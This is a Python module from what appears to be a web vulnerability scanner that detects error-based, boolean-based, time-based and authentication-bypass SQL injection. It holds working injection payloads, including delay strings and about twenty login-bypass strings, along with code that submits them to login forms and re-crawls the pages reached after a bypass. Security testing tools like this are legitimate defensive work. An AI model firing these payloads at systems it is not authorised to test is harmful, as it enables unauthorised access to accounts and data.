"""
SQL Injection Scanner
Detects error-based, boolean-based, time-based, and authentication-bypass SQL injection.
"""
import asyncio
import re
import time
from difflib import SequenceMatcher
from typing import TYPE_CHECKING

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine

# SQL error message patterns for various databases
SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning:.*mysql",
    r"unclosed quotation mark after the character string",
    r"mysql_fetch_array\(\)",
    r"mysql_num_rows\(\)",
    r"supplied argument is not a valid mysql",
    r"mysql server version for the right syntax",
    # PostgreSQL
    r"ERROR:\s+syntax error at or near",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"PostgreSQL.*ERROR",
    # MSSQL
    r"unclosed quotation mark",
    r"microsoft OLE DB Provider for SQL Server",
    r"microsoft SQL Native Client error",
    r"incorrect syntax near",
    r"SQLSTATE\[42000\]",
    # Oracle
    r"ORA-\d{4,5}:",
    r"Oracle error",
    r"oracle.*driver",
    # SQLite
    r"SQLite3::query\(\)",
    r"unrecognized token",
    r"SQLite.*error",
    # Generic
    r"syntax error.*sql",
    r"sql.*syntax error",
    r"database.*error",
    r"odbc.*error",
    r"db2.*error",
]

# Time-based payloads that should cause a delay
TIME_BASED_PAYLOADS = [
    "1' AND SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",
    "1' AND BENCHMARK(3000000,MD5('a'))--",
    "1) AND SLEEP(3)--",
]

# Boolean-based pairs: (true_payload, false_payload)
# A significant response difference between true/false conditions indicates boolean-based SQLi.
BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1) AND (1=1", "1) AND (1=2"),
]

# ── Auth bypass detection ──────────────────────────────────────────────────

# Payloads that are specifically useful for SQL injection authentication bypass.
# These are always tested against fields that look like username/password fields.
AUTH_BYPASS_PAYLOADS = (
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    ") OR ('1'='1",
    ") OR 1=1--",
    "1 OR 1=1",
    "1 OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "' OR ''='",
    "1' OR '1'='1",
)
AUTH_BYPASS_PAYLOAD_SET = frozenset(AUTH_BYPASS_PAYLOADS)

# Field name substrings that indicate a login/authentication field.
_LOGIN_FIELD_KEYWORDS = frozenset([
    "user", "login", "email", "mail", "account", "uname",
    "pass", "pwd", "passwd", "password", "secret", "credential",
])

# Patterns in page source that suggest the login FAILED (not bypassed).
LOGIN_FAILED_PATTERNS = [
    r"invalid (user|pass|credential|login|email|account)",
    r"(user|pass|login|credential|email|account).*(incorrect|wrong|invalid|fail|bad)",
    r"authentication (fail|error|denied|invalid)",
    r"login (fail|error|incorrect|denied|invalid)",
    r"incorrect (user|pass|credential|password|login)",
    r"wrong (user|pass|credential|password|login)",
    r"(access|login|sign.?in) denied",
    r"bad (user|credential|login|password)",
    r"not (found|exist|recognized).*(user|account|email)",
    r"(user|account|email).*(not found|does not exist|unknown)",
    r"(please |try again|retry|re-enter)",
    r"error.*log(in|on)",
]

# Path segments that indicate the browser is still on an auth/error page after submit.
_AUTH_PAGE_KEYWORDS = (
    "/login", "/signin", "/sign-in", "/logon",
    "/auth", "/authenticate",
    "/error", "/403", "/401", "/access-denied",
)


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner."""

    CHECK_TYPE = "sqli"
    SEVERITY = "critical"

    # ------------------------------------------------------------------
    # Auth-bypass helpers
    # ------------------------------------------------------------------

    def _is_login_field(self, field_name: str) -> bool:
        """Return True if the field name suggests a username or password input."""
        n = field_name.lower()
        return any(kw in n for kw in _LOGIN_FIELD_KEYWORDS)

    def _prioritize_login_payloads(self, field_name: str, payloads: list[str]) -> list[str]:
        """
        Keep auth-bypass payloads inside small max-payload scans.

        Without this, --max-payloads can spend the entire SQLi budget on generic
        syntax probes and never test the payloads that matter for login forms.
        """
        if not self._is_login_field(field_name):
            return payloads
        merged = list(AUTH_BYPASS_PAYLOADS)
        merged.extend(p for p in payloads if p not in AUTH_BYPASS_PAYLOAD_SET)
        cap = getattr(self.engine, "max_payloads", 0)
        return merged[:cap] if cap and cap > 0 else merged

    def _detect_auth_bypass(self, original_url: str, source: str) -> tuple[bool, str]:
        """
        Check whether the browser was redirected to an authenticated area after
        the payload was submitted.

        Returns (bypassed: bool, post_url: str).
        """
        try:
            post_url = self.browser.page.url
        except Exception:
            return False, ""

        # URL must differ from where the form was submitted
        if post_url.rstrip("/") == original_url.rstrip("/"):
            return False, post_url

        # Destination must not be another login / error page
        post_lower = post_url.lower()
        if any(kw in post_lower for kw in _AUTH_PAGE_KEYWORDS):
            return False, post_url

        # Response must not contain typical login-failure messages
        if self.check_response_for_patterns(source, LOGIN_FAILED_PATTERNS):
            return False, post_url

        # Minimal content check — blank pages are not a successful bypass
        if len(source.strip()) < 50:
            return False, post_url

        return True, post_url

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        """Scan a form field or URL parameter for SQL injection."""
        findings = []
        field_name = field.get("name", "unknown")
        payloads = await self.get_payloads(field_name, url)
        payloads = self._prioritize_login_payloads(field_name, payloads)

        if self.monitor:
            await self.monitor.emit_status(
                f"SQLi testing: {field_name} on {url}"
            )

        # Get baseline response for comparison (content + timing)
        baseline_source, baseline_pair = await self._get_baseline(
            url, form_index, field_name, is_url_param
        )
        baseline_len = len(baseline_source)

        # Second baseline to measure natural response length variance
        # (dynamic content like ads/timestamps can shift length by hundreds of bytes)
        baseline_source2, _ = await self._get_baseline(url, form_index, field_name, is_url_param)
        baseline_variance = abs(len(baseline_source) - len(baseline_source2))

        # Measure baseline response time for dynamic time-based threshold
        _b_req = baseline_pair.get("request", {})
        _b_resp = baseline_pair.get("response", {})
        _b_ts_req = _b_req.get("timestamp", 0)
        _b_ts_resp = _b_resp.get("timestamp", 0)
        baseline_time = (
            float(_b_ts_resp - _b_ts_req)
            if _b_ts_req and _b_ts_resp
            else 0.0
        )
        # Threshold = baseline + 2.5 s (the injected sleep) with 0.5 s margin
        time_threshold = max(2.5, baseline_time + 2.5)

        for payload in payloads:
            if self.monitor:
                await self.monitor.emit_payload_test(field_name, payload, "sqli", url)

            # Apply payload
            source, pair = await self._apply_payload(
                url, form_index, field_name, payload, is_url_param
            )

            # --- Check 1: Error-based SQLi ---
            match = self.check_response_for_patterns(source, SQL_ERROR_PATTERNS)
            if match:
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=f"SQL error message detected: '{match}'",
                    pair=pair,
                    severity="critical",
                    confidence="confirmed",
                    evidence_type="sqli_error",
                    evidence_details={
                        "matched_error": match,
                        "baseline_length": baseline_len,
                        "attack_length": len(source),
                    },
                    reproduction_steps=[
                        f"Open {url}",
                        f"Submit the payload to '{field_name}'",
                        "Confirm that the response contains a database error message.",
                    ],
                )
                findings.append(finding)
                break  # Found vulnerability, move to next field

            # --- Check 2: Boolean-based blind SQLi ---
            # Compare true vs false condition: if one matches the baseline and the other
            # diverges significantly, it indicates the backend evaluates the expression.
            for true_payload, false_payload in BOOLEAN_PAIRS:
                if payload not in (true_payload, false_payload):
                    continue
                partner = false_payload if payload == true_payload else true_payload
                partner_source, _ = await self._apply_payload(
                    url, form_index, field_name, partner, is_url_param
                )
                true_src = source if payload == true_payload else partner_source
                false_src = partner_source if payload == true_payload else source
                sim_true_base = self._body_similarity(true_src, baseline_source)
                sim_false_base = self._body_similarity(false_src, baseline_source)
                # True condition should resemble baseline; false should differ significantly.
                diff_true_base = abs(len(true_src) - baseline_len)
                diff_false_base = abs(len(false_src) - baseline_len)
                # Require the difference to be at least 4× the natural page variance
                # to avoid false positives from dynamic content (ads, timestamps, etc.)
                min_threshold = max(200, baseline_variance * 4)
                if (
                    baseline_len > 0
                    and diff_false_base > min_threshold
                    and diff_true_base < diff_false_base * 0.5
                    and sim_true_base >= 0.85
                    and sim_false_base <= 0.80
                ):
                    finding = await self.record_finding(
                        url=url,
                        field_name=field_name,
                        payload=payload,
                        evidence=(
                            f"Boolean-based blind SQLi: true condition response length "
                            f"{len(true_src)} vs false condition {len(false_src)} "
                            f"(baseline {baseline_len})"
                        ),
                        pair=pair,
                        severity="high",
                        confidence="likely",
                        evidence_type="sqli_boolean",
                        evidence_details={
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "baseline_length": baseline_len,
                            "true_length": len(true_src),
                            "false_length": len(false_src),
                            "baseline_variance": baseline_variance,
                            "similarity_true_to_baseline": round(sim_true_base, 4),
                            "similarity_false_to_baseline": round(sim_false_base, 4),
                        },
                        reproduction_steps=[
                            f"Open {url}",
                            f"Submit true-condition payload to '{field_name}': {true_payload}",
                            f"Submit false-condition payload to '{field_name}': {false_payload}",
                            "Confirm that the true response resembles baseline while the false response differs materially.",
                        ],
                    )
                    findings.append(finding)
                    break
            if findings:
                break

            # --- Check 3: Time-based blind SQLi ---
            if payload in TIME_BASED_PAYLOADS:
                if self.response_time_exceeded(pair, threshold=time_threshold):
                    finding = await self.record_finding(
                        url=url,
                        field_name=field_name,
                        payload=payload,
                        evidence=f"Time-based blind SQLi: response delayed (>3s)",
                        pair=pair,
                        severity="high",
                        confidence="likely",
                        evidence_type="sqli_time",
                        evidence_details={
                            "baseline_time_seconds": round(baseline_time, 4),
                            "threshold_seconds": round(time_threshold, 4),
                            "payload": payload,
                        },
                        reproduction_steps=[
                            f"Open {url}",
                            f"Submit the time-delay payload to '{field_name}'",
                            "Confirm that response time exceeds the measured baseline threshold.",
                        ],
                    )
                    findings.append(finding)
                    break

            # --- Check 4: Authentication bypass via SQLi ---
            # Only applicable when the field looks like a username/password input
            # and the payload is from the auth-bypass set.
            if (
                not is_url_param
                and self._is_login_field(field_name)
                and payload in AUTH_BYPASS_PAYLOAD_SET
            ):
                bypassed, post_url = self._detect_auth_bypass(url, source)
                if bypassed:
                    finding = await self.record_finding(
                        url=url,
                        field_name=field_name,
                        payload=payload,
                        evidence=(
                            f"SQL injection authentication bypass: login form at {url!r} "
                            f"bypassed with payload {payload!r} — redirected to {post_url!r}"
                        ),
                        pair=pair,
                        severity="critical",
                        confidence="confirmed",
                        evidence_type="sqli_auth_bypass",
                        evidence_details={
                            "post_login_url": post_url,
                            "original_url": url,
                        },
                        reproduction_steps=[
                            f"Open login form {url}",
                            f"Submit auth-bypass payload to '{field_name}'",
                            f"Confirm the browser is redirected to authenticated page {post_url}",
                        ],
                    )
                    findings.append(finding)
                    # Notify the engine so it can re-crawl the authenticated surface
                    if hasattr(self.engine, "signal_auth_bypass"):
                        self.engine.signal_auth_bypass(url, payload, post_url)
                    break

            # Small delay to avoid overwhelming the server
            await asyncio.sleep(0.2 * self.sleep_factor)

        return findings

    def _normalise_body(self, body: str) -> str:
        text = body or ""
        text = re.sub(r"(?is)<script[^>]*>.*?</script>", "", text)
        text = re.sub(r"(?is)<style[^>]*>.*?</style>", "", text)
        text = re.sub(r"\b\d{10,}\b", "0", text)
        text = re.sub(r"\b[0-9a-f]{8,}\b", "x", text, flags=re.IGNORECASE)
        text = re.sub(r"\s+", " ", text)
        return text.strip()[:20000]

    def _body_similarity(self, a: str, b: str) -> float:
        na = self._normalise_body(a)
        nb = self._normalise_body(b)
        if not na or not nb:
            return 0.0
        return SequenceMatcher(None, na, nb).ratio()

    async def _get_baseline(
        self, url: str, form_index: int, field_name: str, is_url_param: bool
    ) -> tuple[str, dict]:
        """Get a baseline response with a safe value."""
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, "baseline_test")
            else:
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, "baseline_test"
                )
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] sqli: baseline failed on {field_name} @ {url}: {exc}"
                )
            return "", {}

    async def verify_finding(self, finding: Finding) -> bool | None:
        from urllib.parse import parse_qs, urlparse
        is_url_param = finding.field_name in parse_qs(
            urlparse(finding.url).query, keep_blank_values=True
        )
        source, pair = await self._apply_payload(
            finding.url,
            0,
            finding.field_name,
            finding.payload,
            is_url_param,
        )
        body = pair.get("response", {}).get("body", "") or source or ""
        etype = getattr(finding, "evidence_type", "")
        if etype == "sqli_error":
            return bool(self.check_response_for_patterns(body, SQL_ERROR_PATTERNS))
        if etype == "sqli_time":
            threshold = float(finding.evidence_details.get("threshold_seconds", 2.5))
            return self.response_time_exceeded(pair, threshold=threshold)
        if etype == "sqli_auth_bypass":
            fresh_result = await self._verify_auth_bypass_fresh_context(finding)
            if fresh_result is not None:
                return fresh_result
            bypassed, _ = self._detect_auth_bypass(finding.url, source)
            return bypassed
        if etype == "sqli_boolean":
            details = finding.evidence_details or {}
            true_payload = details.get("true_payload")
            false_payload = details.get("false_payload")
            if not true_payload or not false_payload:
                return None
            baseline_source, _ = await self._get_baseline(finding.url, 0, finding.field_name, is_url_param)
            true_src, _ = await self._apply_payload(finding.url, 0, finding.field_name, true_payload, is_url_param)
            false_src, _ = await self._apply_payload(finding.url, 0, finding.field_name, false_payload, is_url_param)
            baseline_len = len(baseline_source)
            diff_true_base = abs(len(true_src) - baseline_len)
            diff_false_base = abs(len(false_src) - baseline_len)
            baseline_variance = float(details.get("baseline_variance", 0) or 0)
            min_threshold = max(200, baseline_variance * 4)
            return (
                baseline_len > 0
                and diff_false_base > min_threshold
                and diff_true_base < diff_false_base * 0.5
                and self._body_similarity(true_src, baseline_source) >= 0.85
                and self._body_similarity(false_src, baseline_source) <= 0.80
            )
        return None

    async def _verify_auth_bypass_fresh_context(self, finding: Finding) -> bool | None:
        """Re-test auth bypass in a clean browser context to avoid session/dialog noise."""
        try:
            from wscan.browser import BrowserManager
            timeout_seconds = max(1, int(getattr(self.browser, "timeout", 30000) / 1000))
            browser = BrowserManager(
                headless=getattr(self.browser, "headless", True),
                timeout=timeout_seconds,
                monitor=None,
                auth_user=getattr(self.browser, "auth_user", ""),
                auth_pass=getattr(self.browser, "auth_pass", ""),
                proxy=getattr(self.browser, "proxy", ""),
                sleep_factor=getattr(self.browser, "sleep_factor", 1.0),
            )
            await browser.init()
            previous_browser = self.browser
            self.browser = browser
            try:
                source, _ = await self._apply_payload(
                    finding.url,
                    0,
                    finding.field_name,
                    finding.payload,
                    False,
                )
                bypassed, _ = self._detect_auth_bypass(finding.url, source)
                return bypassed
            finally:
                self.browser = previous_browser
                await browser.close()
        except Exception:
            return None

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        """Apply a payload to the target field."""
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, payload)
            else:
                # Re-navigate to the page before each test
                await self.browser.navigate(url)
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, payload
                )
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] sqli: _apply_payload failed on {field_name} @ {url}: {exc}"
                )
            return "", {}
